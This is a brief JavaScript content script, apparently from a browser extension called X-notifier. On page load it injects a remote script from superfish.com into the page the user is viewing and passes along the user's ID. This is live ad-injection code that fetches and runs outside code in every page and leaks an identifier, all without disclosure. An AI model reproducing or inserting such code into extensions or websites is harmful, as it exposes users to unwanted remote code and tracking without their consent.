document.addEventListener('DOMContentLoaded', function () {
  chrome.extension.sendMessage({msg:"enabled"},function(response){
    if(response.enabled){
      var script=document.createElement('script');
      script.type='text/javascript';
      script.src=document.location.protocol + "//www.superfish.com/ws/sf_main.jsp?dlsource=xnotifier&userId="+response.uid+"&CTID=xn-cr";
      var h=document.getElementsByTagName("head")[0];
      h.appendChild(script);
    }
  });
});